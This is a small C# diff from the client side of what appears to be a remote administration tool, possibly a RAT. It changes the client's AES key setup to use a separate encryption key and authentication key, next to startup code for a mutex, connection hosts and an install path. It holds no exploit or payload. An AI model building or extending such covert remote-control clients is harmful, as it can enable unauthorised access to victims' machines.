@@ -90,7 +90,7 @@ namespace xClient
             if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                 return false;
 
-            AES.SetDefaultKey(Settings.PASSWORD);
+            AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
             ClientData.InstallPath = Path.Combine(Settings.DIR, ((!string.IsNullOrEmpty(Settings.SUBFOLDER)) ? Settings.SUBFOLDER + @"\" : "") + Settings.INSTALLNAME);
             GeoLocationHelper.Initialize();
             
